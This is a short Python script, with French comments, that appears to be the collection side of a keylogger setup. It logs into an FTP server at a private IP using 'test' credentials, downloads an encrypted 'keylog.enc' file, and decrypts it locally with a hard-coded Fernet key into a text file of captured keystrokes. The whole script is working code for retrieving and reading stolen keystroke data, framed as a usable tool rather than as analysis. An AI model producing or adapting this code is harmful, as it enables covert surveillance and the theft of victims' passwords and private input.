from ftplib import FTP
from cryptography.fernet import Fernet

KEY = b'MguzizZ9gBYmKnDfGSITBF8SOssUr5Egd1BPf3AdJVk=' 
fernet = Fernet(KEY)

FTP_SERVER = "192.168.10.72"
FTP_USER = "test"
FTP_PASS = "test"

def download_file(ftp, filename):
    with open(filename, "wb") as f:
        ftp.retrbinary(f"RETR {filename}", f.write)

def decrypt_file(encrypted_path, decrypted_path):
    with open(encrypted_path, "rb") as f_enc:
        encrypted_data = f_enc.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(decrypted_path, "wb") as f_dec:
        f_dec.write(decrypted_data)

def main():
    ftp = FTP(FTP_SERVER)
    ftp.login(FTP_USER, FTP_PASS)

    # Télécharger uniquement le fichier chiffré
    enc_file = "keylog.enc"
    download_file(ftp, enc_file)
    ftp.quit()

    # Déchiffrer localement
    decrypt_file(enc_file, "keylogerdéchiffré.txt")
    print("Fichier déchiffré sauvegardé dans keylogerdéchiffré.txt")

if __name__ == "__main__":
    main()
